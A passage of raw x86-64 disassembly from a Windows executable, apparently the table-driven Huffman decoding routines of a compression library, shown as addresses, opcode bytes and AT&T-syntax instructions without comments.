   140002b8d:	41 83 c1 04          	add    $0x4,%r9d
   140002b91:	41 0f b6 94 0e e4 01 	movzbl 0x1e4(%r14,%rcx,1),%edx
   140002b98:	00 00 
   140002b9a:	48 0b d7             	or     %rdi,%rdx
   140002b9d:	48 0f af d6          	imul   %rsi,%rdx
   140002ba1:	48 89 54 43 04       	mov    %rdx,0x4(%rbx,%rax,2)
   140002ba6:	45 3b c3             	cmp    %r11d,%r8d
   140002ba9:	7c d5                	jl     0x140002b80
   140002bab:	e9 1c ff ff ff       	jmp    0x140002acc
   140002bb0:	33 d2                	xor    %edx,%edx
   140002bb2:	45 85 db             	test   %r11d,%r11d
   140002bb5:	0f 8e 11 ff ff ff    	jle    0x140002acc
   140002bbb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002bc0:	8d 04 2a             	lea    (%rdx,%rbp,1),%eax
   140002bc3:	ff c2                	inc    %edx
   140002bc5:	48 63 c8             	movslq %eax,%rcx
   140002bc8:	41 0f b6 84 0e e4 01 	movzbl 0x1e4(%r14,%rcx,1),%eax
   140002bcf:	00 00 
   140002bd1:	49 63 c9             	movslq %r9d,%rcx
   140002bd4:	41 83 c1 02          	add    $0x2,%r9d
   140002bd8:	88 44 4b 04          	mov    %al,0x4(%rbx,%rcx,2)
   140002bdc:	40 88 7c 4b 05       	mov    %dil,0x5(%rbx,%rcx,2)
   140002be1:	88 44 4b 06          	mov    %al,0x6(%rbx,%rcx,2)
   140002be5:	40 88 7c 4b 07       	mov    %dil,0x7(%rbx,%rcx,2)
   140002bea:	41 3b d3             	cmp    %r11d,%edx
   140002bed:	7c d1                	jl     0x140002bc0
   140002bef:	e9 d8 fe ff ff       	jmp    0x140002acc
   140002bf4:	45 33 c0             	xor    %r8d,%r8d
   140002bf7:	45 85 db             	test   %r11d,%r11d
   140002bfa:	0f 8e cc fe ff ff    	jle    0x140002acc
   140002c00:	41 8d 04 28          	lea    (%r8,%rbp,1),%eax
   140002c04:	49 63 d1             	movslq %r9d,%rdx
   140002c07:	48 63 c8             	movslq %eax,%rcx
   140002c0a:	41 ff c1             	inc    %r9d
   140002c0d:	41 ff c0             	inc    %r8d
   140002c10:	41 0f b6 84 0e e4 01 	movzbl 0x1e4(%r14,%rcx,1),%eax
   140002c17:	00 00 
   140002c19:	88 44 53 04          	mov    %al,0x4(%rbx,%rdx,2)
   140002c1d:	40 88 7c 53 05       	mov    %dil,0x5(%rbx,%rdx,2)
   140002c22:	45 3b c3             	cmp    %r11d,%r8d
   140002c25:	7c d9                	jl     0x140002c00
   140002c27:	e9 a0 fe ff ff       	jmp    0x140002acc
   140002c2c:	cc                   	int3
   140002c2d:	cc                   	int3
   140002c2e:	cc                   	int3
   140002c2f:	cc                   	int3
   140002c30:	40 53                	rex push %rbx
   140002c32:	57                   	push   %rdi
   140002c33:	41 55                	push   %r13
   140002c35:	48 83 ec 60          	sub    $0x60,%rsp
   140002c39:	48 8b bc 24 a0 00 00 	mov    0xa0(%rsp),%rdi
   140002c40:	00 
   140002c41:	49 8b c0             	mov    %r8,%rax
   140002c44:	4c 8b ea             	mov    %rdx,%r13
   140002c47:	4c 8b d9             	mov    %rcx,%r11
   140002c4a:	4d 8b c1             	mov    %r9,%r8
   140002c4d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002c52:	48 8b d0             	mov    %rax,%rdx
   140002c55:	8b 1f                	mov    (%rdi),%ebx
   140002c57:	e8 c4 e4 ff ff       	call   0x140001120
   140002c5c:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140002c60:	0f 87 ba 01 00 00    	ja     0x140002e20
   140002c66:	4c 8b 54 24 30       	mov    0x30(%rsp),%r10
   140002c6b:	44 8b 4c 24 28       	mov    0x28(%rsp),%r9d
   140002c70:	48 89 ac 24 80 00 00 	mov    %rbp,0x80(%rsp)
   140002c77:	00 
   140002c78:	bd 3f 00 00 00       	mov    $0x3f,%ebp
   140002c7d:	48 89 b4 24 88 00 00 	mov    %rsi,0x88(%rsp)
   140002c84:	00 
   140002c85:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002c8a:	c1 eb 10             	shr    $0x10,%ebx
   140002c8d:	2b eb                	sub    %ebx,%ebp
   140002c8f:	4c 89 a4 24 90 00 00 	mov    %r12,0x90(%rsp)
   140002c96:	00 
   140002c97:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140002c9c:	ff c5                	inc    %ebp
   140002c9e:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   140002ca3:	83 e5 3f             	and    $0x3f,%ebp
   140002ca6:	4f 8d 34 2b          	lea    (%r11,%r13,1),%r14
   140002caa:	4c 89 7c 24 50       	mov    %r15,0x50(%rsp)
   140002caf:	4c 8b 7c 24 40       	mov    0x40(%rsp),%r15
   140002cb4:	4d 8d 66 fd          	lea    -0x3(%r14),%r12
   140002cb8:	41 83 f9 40          	cmp    $0x40,%r9d
   140002cbc:	76 07                	jbe    0x140002cc5
   140002cbe:	b8 03 00 00 00       	mov    $0x3,%eax
   140002cc3:	eb 58                	jmp    0x140002d1d
   140002cc5:	4d 3b d7             	cmp    %r15,%r10
   140002cc8:	72 12                	jb     0x140002cdc
   140002cca:	41 8b c1             	mov    %r9d,%eax
   140002ccd:	41 83 e1 07          	and    $0x7,%r9d
   140002cd1:	48 c1 e8 03          	shr    $0x3,%rax
   140002cd5:	4c 2b d0             	sub    %rax,%r10
   140002cd8:	33 c0                	xor    %eax,%eax
   140002cda:	eb 3e                	jmp    0x140002d1a
   140002cdc:	4c 3b d6             	cmp    %rsi,%r10
   140002cdf:	75 0b                	jne    0x140002cec
   140002ce1:	41 83 f9 40          	cmp    $0x40,%r9d
   140002ce5:	1b c0                	sbb    %eax,%eax
   140002ce7:	83 c0 02             	add    $0x2,%eax
   140002cea:	eb 31                	jmp    0x140002d1d
   140002cec:	41 8b d1             	mov    %r9d,%edx
   140002cef:	49 8b c2             	mov    %r10,%rax
   140002cf2:	c1 ea 03             	shr    $0x3,%edx
   140002cf5:	48 2b c2             	sub    %rdx,%rax
   140002cf8:	48 3b c6             	cmp    %rsi,%rax
   140002cfb:	73 0c                	jae    0x140002d09
   140002cfd:	41 8b d2             	mov    %r10d,%edx
   140002d00:	b8 01 00 00 00       	mov    $0x1,%eax
   140002d05:	2b d6                	sub    %esi,%edx
   140002d07:	eb 02                	jmp    0x140002d0b
   140002d09:	33 c0                	xor    %eax,%eax
   140002d0b:	8b ca                	mov    %edx,%ecx
   140002d0d:	4c 2b d1             	sub    %rcx,%r10
   140002d10:	8d 0c d5 00 00 00 00 	lea    0x0(,%rdx,8),%ecx
   140002d17:	44 2b c9             	sub    %ecx,%r9d
   140002d1a:	49 8b 1a             	mov    (%r10),%rbx
   140002d1d:	33 d2                	xor    %edx,%edx
   140002d1f:	4d 3b dc             	cmp    %r12,%r11
   140002d22:	0f 92 c2             	setb   %dl
   140002d25:	33 c9                	xor    %ecx,%ecx
   140002d27:	85 c0                	test   %eax,%eax
   140002d29:	0f 94 c1             	sete   %cl
   140002d2c:	85 d1                	test   %edx,%ecx
   140002d2e:	0f 84 88 00 00 00    	je     0x140002dbc
   140002d34:	41 8b c9             	mov    %r9d,%ecx
   140002d37:	48 8b d3             	mov    %rbx,%rdx
   140002d3a:	48 d3 e2             	shl    %cl,%rdx
   140002d3d:	8b cd                	mov    %ebp,%ecx
   140002d3f:	48 d3 ea             	shr    %cl,%rdx
   140002d42:	0f b6 44 57 04       	movzbl 0x4(%rdi,%rdx,2),%eax
   140002d47:	44 0f b6 44 57 05    	movzbl 0x5(%rdi,%rdx,2),%r8d
   140002d4d:	48 8b d3             	mov    %rbx,%rdx
   140002d50:	41 88 03             	mov    %al,(%r11)
   140002d53:	45 03 c1             	add    %r9d,%r8d
   140002d56:	41 8b c8             	mov    %r8d,%ecx
   140002d59:	48 d3 e2             	shl    %cl,%rdx
   140002d5c:	8b cd                	mov    %ebp,%ecx
   140002d5e:	48 d3 ea             	shr    %cl,%rdx
   140002d61:	0f b6 44 57 04       	movzbl 0x4(%rdi,%rdx,2),%eax
   140002d66:	44 0f b6 4c 57 05    	movzbl 0x5(%rdi,%rdx,2),%r9d
   140002d6c:	48 8b d3             	mov    %rbx,%rdx
   140002d6f:	41 88 43 01          	mov    %al,0x1(%r11)
   140002d73:	45 03 c8             	add    %r8d,%r9d
   140002d76:	41 8b c9             	mov    %r9d,%ecx
   140002d79:	48 d3 e2             	shl    %cl,%rdx
   140002d7c:	8b cd                	mov    %ebp,%ecx
   140002d7e:	48 d3 ea             	shr    %cl,%rdx
   140002d81:	44 0f b6 44 57 05    	movzbl 0x5(%rdi,%rdx,2),%r8d
   140002d87:	0f b6 44 57 04       	movzbl 0x4(%rdi,%rdx,2),%eax
   140002d8c:	45 03 c1             	add    %r9d,%r8d
   140002d8f:	41 88 43 02          	mov    %al,0x2(%r11)
   140002d93:	41 8b c8             	mov    %r8d,%ecx
   140002d96:	48 8b c3             	mov    %rbx,%rax
   140002d99:	48 d3 e0             	shl    %cl,%rax
   140002d9c:	8b cd                	mov    %ebp,%ecx
   140002d9e:	48 d3 e8             	shr    %cl,%rax
   140002da1:	44 0f b6 4c 47 05    	movzbl 0x5(%rdi,%rax,2),%r9d
   140002da7:	0f b6 44 47 04       	movzbl 0x4(%rdi,%rax,2),%eax
   140002dac:	45 03 c8             	add    %r8d,%r9d
   140002daf:	41 88 43 03          	mov    %al,0x3(%r11)
   140002db3:	49 83 c3 04          	add    $0x4,%r11
   140002db7:	e9 fc fe ff ff       	jmp    0x140002cb8
   140002dbc:	4c 8b 7c 24 50       	mov    0x50(%rsp),%r15
   140002dc1:	4c 8b a4 24 90 00 00 	mov    0x90(%rsp),%r12
   140002dc8:	00 
   140002dc9:	4d 3b de             	cmp    %r14,%r11
   140002dcc:	73 28                	jae    0x140002df6
   140002dce:	66 90                	xchg   %ax,%ax
   140002dd0:	41 8b c9             	mov    %r9d,%ecx
   140002dd3:	48 8b d3             	mov    %rbx,%rdx
   140002dd6:	48 d3 e2             	shl    %cl,%rdx
   140002dd9:	8b cd                	mov    %ebp,%ecx
   140002ddb:	48 d3 ea             	shr    %cl,%rdx
   140002dde:	0f b6 44 57 05       	movzbl 0x5(%rdi,%rdx,2),%eax
   140002de3:	0f b6 4c 57 04       	movzbl 0x4(%rdi,%rdx,2),%ecx
   140002de8:	44 03 c8             	add    %eax,%r9d
   140002deb:	41 88 0b             	mov    %cl,(%r11)
   140002dee:	49 ff c3             	inc    %r11
   140002df1:	4d 3b de             	cmp    %r14,%r11
   140002df4:	72 da                	jb     0x140002dd0
   140002df6:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   140002dfb:	4c 3b d6             	cmp    %rsi,%r10
   140002dfe:	48 8b b4 24 88 00 00 	mov    0x88(%rsp),%rsi
   140002e05:	00 
   140002e06:	48 8b ac 24 80 00 00 	mov    0x80(%rsp),%rbp
   140002e0d:	00 
   140002e0e:	75 09                	jne    0x140002e19
   140002e10:	49 8b c5             	mov    %r13,%rax
   140002e13:	41 83 f9 40          	cmp    $0x40,%r9d
   140002e17:	74 07                	je     0x140002e20
   140002e19:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   140002e20:	48 83 c4 60          	add    $0x60,%rsp
   140002e24:	41 5d                	pop    %r13
   140002e26:	5f                   	pop    %rdi
   140002e27:	5b                   	pop    %rbx
   140002e28:	c3                   	ret
   140002e29:	cc                   	int3
   140002e2a:	cc                   	int3
   140002e2b:	cc                   	int3
   140002e2c:	cc                   	int3
   140002e2d:	cc                   	int3
   140002e2e:	cc                   	int3
   140002e2f:	cc                   	int3
   140002e30:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002e35:	55                   	push   %rbp
   140002e36:	41 55                	push   %r13
   140002e38:	41 57                	push   %r15
   140002e3a:	48 8d 6c 24 d0       	lea    -0x30(%rsp),%rbp
   140002e3f:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
   140002e46:	4c 8b fa             	mov    %rdx,%r15
   140002e49:	4c 8b e9             	mov    %rcx,%r13
   140002e4c:	49 83 f9 0a          	cmp    $0xa,%r9
   140002e50:	73 14                	jae    0x140002e66
   140002e52:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   140002e59:	48 81 c4 30 01 00 00 	add    $0x130,%rsp
   140002e60:	41 5f                	pop    %r15
   140002e62:	41 5d                	pop    %r13
   140002e64:	5d                   	pop    %rbp
   140002e65:	c3                   	ret
   140002e66:	48 89 b4 24 28 01 00 	mov    %rsi,0x128(%rsp)
   140002e6d:	00 
   140002e6e:	41 0f b7 30          	movzwl (%r8),%esi
   140002e72:	48 89 bc 24 20 01 00 	mov    %rdi,0x120(%rsp)
   140002e79:	00 
   140002e7a:	41 0f b7 78 04       	movzwl 0x4(%r8),%edi
   140002e7f:	4c 89 a4 24 18 01 00 	mov    %r12,0x118(%rsp)
   140002e86:	00 
   140002e87:	4d 8b e1             	mov    %r9,%r12
   140002e8a:	4c 2b e7             	sub    %rdi,%r12
   140002e8d:	4c 89 b4 24 10 01 00 	mov    %r14,0x110(%rsp)
   140002e94:	00 
   140002e95:	45 0f b7 70 02       	movzwl 0x2(%r8),%r14d
   140002e9a:	4d 2b e6             	sub    %r14,%r12
   140002e9d:	4c 2b e6             	sub    %rsi,%r12
   140002ea0:	49 83 c4 fa          	add    $0xfffffffffffffffa,%r12
   140002ea4:	4d 3b e1             	cmp    %r9,%r12
   140002ea7:	76 0c                	jbe    0x140002eb5
   140002ea9:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   140002eb0:	e9 09 0a 00 00       	jmp    0x1400038be
   140002eb5:	48 89 9c 24 50 01 00 	mov    %rbx,0x150(%rsp)
   140002ebc:	00 
   140002ebd:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140002ec2:	48 8b 5d 70          	mov    0x70(%rbp),%rbx
   140002ec6:	8b 03                	mov    (%rbx),%eax
   140002ec8:	89 45 78             	mov    %eax,0x78(%rbp)
   140002ecb:	49 8d 40 06          	lea    0x6(%r8),%rax
   140002ecf:	48 8b d0             	mov    %rax,%rdx
   140002ed2:	48 89 45 68          	mov    %rax,0x68(%rbp)
   140002ed6:	4c 8b c6             	mov    %rsi,%r8
   140002ed9:	e8 42 e2 ff ff       	call   0x140001120
   140002ede:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140002ee2:	0f 87 ce 09 00 00    	ja     0x1400038b6
   140002ee8:	48 03 75 68          	add    0x68(%rbp),%rsi
   140002eec:	48 8d 4d 88          	lea    -0x78(%rbp),%rcx
   140002ef0:	48 8b d6             	mov    %rsi,%rdx
   140002ef3:	4d 8b c6             	mov    %r14,%r8
   140002ef6:	e8 25 e2 ff ff       	call   0x140001120
   140002efb:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140002eff:	0f 87 b1 09 00 00    	ja     0x1400038b6
   140002f05:	49 03 f6             	add    %r14,%rsi
   140002f08:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140002f0c:	48 8b d6             	mov    %rsi,%rdx
   140002f0f:	4c 8b c7             	mov    %rdi,%r8
   140002f12:	e8 09 e2 ff ff       	call   0x140001120
   140002f17:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140002f1b:	0f 87 95 09 00 00    	ja     0x1400038b6
   140002f21:	48 8d 14 37          	lea    (%rdi,%rsi,1),%rdx
   140002f25:	4d 8b c4             	mov    %r12,%r8
   140002f28:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140002f2c:	e8 ef e1 ff ff       	call   0x140001120
   140002f31:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140002f35:	0f 87 7b 09 00 00    	ja     0x1400038b6
   140002f3b:	44 8b 45 78          	mov    0x78(%rbp),%r8d
   140002f3f:	4b 8d 04 2f          	lea    (%r15,%r13,1),%rax
   140002f43:	4c 8d 48 fd          	lea    -0x3(%rax),%r9
   140002f47:	41 c1 e8 10          	shr    $0x10,%r8d
   140002f4b:	48 89 45 08          	mov    %rax,0x8(%rbp)
   140002f4f:	be 3f 00 00 00       	mov    $0x3f,%esi
   140002f54:	45 0f b6 f0          	movzbl %r8b,%r14d
   140002f58:	49 8d 47 03          	lea    0x3(%r15),%rax
   140002f5c:	48 c1 e8 02          	shr    $0x2,%rax
   140002f60:	44 8b c6             	mov    %esi,%r8d
   140002f63:	45 2b c6             	sub    %r14d,%r8d
   140002f66:	4c 89 4c 24 48       	mov    %r9,0x48(%rsp)
   140002f6b:	44 89 75 68          	mov    %r14d,0x68(%rbp)
   140002f6f:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   140002f74:	4a 8d 0c 28          	lea    (%rax,%r13,1),%rcx
   140002f78:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
   140002f7c:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
   140002f80:	48 03 c2             	add    %rdx,%rax
   140002f83:	48 89 54 24 50       	mov    %rdx,0x50(%rsp)
   140002f88:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140002f8d:	48 8b f9             	mov    %rcx,%rdi
   140002f90:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140002f95:	4c 8b fa             	mov    %rdx,%r15
   140002f98:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   140002f9d:	4c 8b e0             	mov    %rax,%r12
   140002fa0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002fa5:	49 3b c1             	cmp    %r9,%rax
   140002fa8:	0f 83 20 03 00 00    	jae    0x1400032ce
   140002fae:	45 8d 48 01          	lea    0x1(%r8),%r9d
   140002fb2:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140002fb9:	00 
   140002fba:	44 23 ce             	and    %esi,%r9d
   140002fbd:	41 8b c6             	mov    %r14d,%eax
   140002fc0:	f7 d8                	neg    %eax
   140002fc2:	44 89 4c 24 3c       	mov    %r9d,0x3c(%rsp)
   140002fc7:	23 c6                	and    %esi,%eax
   140002fc9:	89 45 78             	mov    %eax,0x78(%rbp)
   140002fcc:	0f 1f 40 00          	nopl   0x0(%rax)
   140002fd0:	44 8b 44 24 68       	mov    0x68(%rsp),%r8d
   140002fd5:	41 8b c8             	mov    %r8d,%ecx
   140002fd8:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140002fdd:	4c 8b 75 88          	mov    -0x78(%rbp),%r14
   140002fe1:	48 8b d6             	mov    %rsi,%rdx
   140002fe4:	48 d3 e2             	shl    %cl,%rdx
   140002fe7:	41 8b c9             	mov    %r9d,%ecx
   140002fea:	48 d3 ea             	shr    %cl,%rdx
   140002fed:	4c 8b 7d b0          	mov    -0x50(%rbp),%r15
   140002ff1:	4c 8b 65 e0          	mov    -0x20(%rbp),%r12
   140002ff5:	0f b6 7c 53 05       	movzbl 0x5(%rbx,%rdx,2),%edi
   140002ffa:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   140002fff:	41 03 f8             	add    %r8d,%edi
   140003002:	44 8b 45 90          	mov    -0x70(%rbp),%r8d
   140003006:	49 8b d6             	mov    %r14,%rdx
   140003009:	41 88 45 00          	mov    %al,0x0(%r13)
   14000300d:	41 8b c8             	mov    %r8d,%ecx
   140003010:	48 d3 e2             	shl    %cl,%rdx
   140003013:	41 8b c9             	mov    %r9d,%ecx
   140003016:	48 d3 ea             	shr    %cl,%rdx
   140003019:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000301e:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   140003023:	44 0f b6 54 53 05    	movzbl 0x5(%rbx,%rdx,2),%r10d
   140003029:	49 8b d7             	mov    %r15,%rdx
   14000302c:	88 01                	mov    %al,(%rcx)
   14000302e:	45 03 d0             	add    %r8d,%r10d
   140003031:	44 8b 45 b8          	mov    -0x48(%rbp),%r8d
   140003035:	41 8b c8             	mov    %r8d,%ecx
   140003038:	48 d3 e2             	shl    %cl,%rdx
   14000303b:	41 8b c9             	mov    %r9d,%ecx
   14000303e:	48 d3 ea             	shr    %cl,%rdx
   140003041:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003046:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   14000304b:	44 0f b6 5c 53 05    	movzbl 0x5(%rbx,%rdx,2),%r11d
   140003051:	49 8b d4             	mov    %r12,%rdx
   140003054:	88 01                	mov    %al,(%rcx)
   140003056:	45 03 d8             	add    %r8d,%r11d
   140003059:	44 8b 45 e8          	mov    -0x18(%rbp),%r8d
   14000305d:	41 8b c8             	mov    %r8d,%ecx
   140003060:	48 d3 e2             	shl    %cl,%rdx
   140003063:	41 8b c9             	mov    %r9d,%ecx
   140003066:	48 d3 ea             	shr    %cl,%rdx
   140003069:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   14000306e:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   140003073:	44 0f b6 4c 53 05    	movzbl 0x5(%rbx,%rdx,2),%r9d
   140003079:	48 8b d6             	mov    %rsi,%rdx
   14000307c:	88 01                	mov    %al,(%rcx)
   14000307e:	45 03 c8             	add    %r8d,%r9d
   140003081:	8b cf                	mov    %edi,%ecx
   140003083:	48 d3 e2             	shl    %cl,%rdx
   140003086:	8b 4d 78             	mov    0x78(%rbp),%ecx
   140003089:	48 d3 ea             	shr    %cl,%rdx
   14000308c:	41 8b ca             	mov    %r10d,%ecx
   14000308f:	44 0f b6 44 53 05    	movzbl 0x5(%rbx,%rdx,2),%r8d
   140003095:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   14000309a:	44 03 c7             	add    %edi,%r8d
   14000309d:	8b 7d 78             	mov    0x78(%rbp),%edi
   1400030a0:	49 8b d6             	mov    %r14,%rdx
   1400030a3:	48 d3 e2             	shl    %cl,%rdx
   1400030a6:	8b cf                	mov    %edi,%ecx
   1400030a8:	48 d3 ea             	shr    %cl,%rdx
   1400030ab:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400030b0:	41 88 45 01          	mov    %al,0x1(%r13)
   1400030b4:	0f b6 44 53 05       	movzbl 0x5(%rbx,%rdx,2),%eax
   1400030b9:	44 03 d0             	add    %eax,%r10d
   1400030bc:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   1400030c1:	88 41 01             	mov    %al,0x1(%rcx)
   1400030c4:	49 8b d7             	mov    %r15,%rdx
   1400030c7:	41 8b cb             	mov    %r11d,%ecx
   1400030ca:	48 d3 e2             	shl    %cl,%rdx
   1400030cd:	8b cf                	mov    %edi,%ecx
   1400030cf:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400030d4:	48 d3 ea             	shr    %cl,%rdx
   1400030d7:	41 8b c9             	mov    %r9d,%ecx
   1400030da:	0f b6 44 53 05       	movzbl 0x5(%rbx,%rdx,2),%eax
   1400030df:	44 03 d8             	add    %eax,%r11d
   1400030e2:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   1400030e7:	49 8b d4             	mov    %r12,%rdx
   1400030ea:	88 47 01             	mov    %al,0x1(%rdi)
   1400030ed:	48 d3 e2             	shl    %cl,%rdx
   1400030f0:	8b 4d 78             	mov    0x78(%rbp),%ecx
   1400030f3:	48 d3 ea             	shr    %cl,%rdx
   1400030f6:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400030fb:	0f b6 44 53 05       	movzbl 0x5(%rbx,%rdx,2),%eax
   140003100:	44 03 c8             	add    %eax,%r9d
   140003103:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   140003108:	88 41 01             	mov    %al,0x1(%rcx)
   14000310b:	48 8b d6             	mov    %rsi,%rdx
   14000310e:	41 8b c8             	mov    %r8d,%ecx
   140003111:	48 d3 e2             	shl    %cl,%rdx
   140003114:	8b 4d 78             	mov    0x78(%rbp),%ecx
   140003117:	48 d3 ea             	shr    %cl,%rdx
   14000311a:	41 8b ca             	mov    %r10d,%ecx
   14000311d:	0f b6 44 53 05       	movzbl 0x5(%rbx,%rdx,2),%eax
   140003122:	44 03 c0             	add    %eax,%r8d
   140003125:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   14000312a:	41 88 45 02          	mov    %al,0x2(%r13)
   14000312e:	49 8b d6             	mov    %r14,%rdx
   140003131:	48 d3 e2             	shl    %cl,%rdx
   140003134:	8b 4d 78             	mov    0x78(%rbp),%ecx
   140003137:	48 d3 ea             	shr    %cl,%rdx
   14000313a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000313f:	0f b6 44 53 05       	movzbl 0x5(%rbx,%rdx,2),%eax
   140003144:	44 03 d0             	add    %eax,%r10d
   140003147:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   14000314c:	88 41 02             	mov    %al,0x2(%rcx)
   14000314f:	49 8b d7             	mov    %r15,%rdx
   140003152:	41 8b cb             	mov    %r11d,%ecx
   140003155:	48 d3 e2             	shl    %cl,%rdx
   140003158:	8b 4d 78             	mov    0x78(%rbp),%ecx
   14000315b:	48 d3 ea             	shr    %cl,%rdx
   14000315e:	41 8b c9             	mov    %r9d,%ecx
   140003161:	0f b6 44 53 05       	movzbl 0x5(%rbx,%rdx,2),%eax
   140003166:	44 03 d8             	add    %eax,%r11d
   140003169:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   14000316e:	88 47 02             	mov    %al,0x2(%rdi)
   140003171:	49 8b d4             	mov    %r12,%rdx
   140003174:	8b 7c 24 3c          	mov    0x3c(%rsp),%edi
   140003178:	48 d3 e2             	shl    %cl,%rdx
   14000317b:	8b cf                	mov    %edi,%ecx
   14000317d:	48 d3 ea             	shr    %cl,%rdx
   140003180:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140003185:	0f b6 44 53 05       	movzbl 0x5(%rbx,%rdx,2),%eax
   14000318a:	44 03 c8             	add    %eax,%r9d
   14000318d:	0f b6 44 53 04       	movzbl 0x4(%rbx,%rdx,2),%eax
   140003192:	88 41 02             	mov    %al,0x2(%rcx)
   140003195:	41 8b c8             	mov    %r8d,%ecx
   140003198:	48 d3 e6             	shl    %cl,%rsi
   14000319b:	8b cf                	mov    %edi,%ecx
   14000319d:	48 d3 ee             	shr    %cl,%rsi
   1400031a0:	41 8b ca             	mov    %r10d,%ecx
   1400031a3:	49 d3 e6             	shl    %cl,%r14
   1400031a6:	8b cf                	mov    %edi,%ecx
   1400031a8:	49 d3 ee             	shr    %cl,%r14
   1400031ab:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400031b0:	0f b6 44 73 05       	movzbl 0x5(%rbx,%rsi,2),%eax
   1400031b5:	41 03 c0             	add    %r8d,%eax
   1400031b8:	89 44 24 68          	mov    %eax,0x68(%rsp)
   1400031bc:	0f b6 44 73 04       	movzbl 0x4(%rbx,%rsi,2),%eax
   1400031c1:	41 88 45 03          	mov    %al,0x3(%r13)
   1400031c5:	49 83 c5 04          	add    $0x4,%r13
   1400031c9:	42 0f b6 44 73 05    	movzbl 0x5(%rbx,%r14,2),%eax
   1400031cf:	41 03 c2             	add    %r10d,%eax
   1400031d2:	89 45 90             	mov    %eax,-0x70(%rbp)
   1400031d5:	42 0f b6 44 73 04    	movzbl 0x4(%rbx,%r14,2),%eax
   1400031db:	88 41 03             	mov    %al,0x3(%rcx)
   1400031de:	48 83 c1 04          	add    $0x4,%rcx
   1400031e2:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400031e7:	41 8b cb             	mov    %r11d,%ecx
   1400031ea:	49 d3 e7             	shl    %cl,%r15
   1400031ed:	8b cf                	mov    %edi,%ecx
   1400031ef:	49 d3 ef             	shr    %cl,%r15
   1400031f2:	41 8b c9             	mov    %r9d,%ecx
   1400031f5:	42 0f b6 44 7b 05    	movzbl 0x5(%rbx,%r15,2),%eax
   1400031fb:	41 03 c3             	add    %r11d,%eax
   1400031fe:	89 45 b8             	mov    %eax,-0x48(%rbp)
   140003201:	42 0f b6 44 7b 04    	movzbl 0x4(%rbx,%r15,2),%eax
   140003207:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   14000320c:	41 88 47 03          	mov    %al,0x3(%r15)
   140003210:	49 83 c7 04          	add    $0x4,%r15
   140003214:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   140003219:	49 d3 e4             	shl    %cl,%r12
   14000321c:	8b cf                	mov    %edi,%ecx
   14000321e:	49 d3 ec             	shr    %cl,%r12
   140003221:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003226:	42 0f b6 44 63 05    	movzbl 0x5(%rbx,%r12,2),%eax
   14000322c:	41 03 c1             	add    %r9d,%eax
   14000322f:	89 45 e8             	mov    %eax,-0x18(%rbp)
   140003232:	42 0f b6 44 63 04    	movzbl 0x4(%rbx,%r12,2),%eax
   140003238:	4c 8b 64 24 28       	mov    0x28(%rsp),%r12
   14000323d:	41 88 44 24 03       	mov    %al,0x3(%r12)
   140003242:	49 83 c4 04          	add    $0x4,%r12
   140003246:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   14000324b:	e8 30 e0 ff ff       	call   0x140001280
   140003250:	48 8d 4d 88          	lea    -0x78(%rbp),%rcx
   140003254:	44 8b f0             	mov    %eax,%r14d
   140003257:	e8 24 e0 ff ff       	call   0x140001280
   14000325c:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140003260:	8b f0                	mov    %eax,%esi
   140003262:	e8 19 e0 ff ff       	call   0x140001280
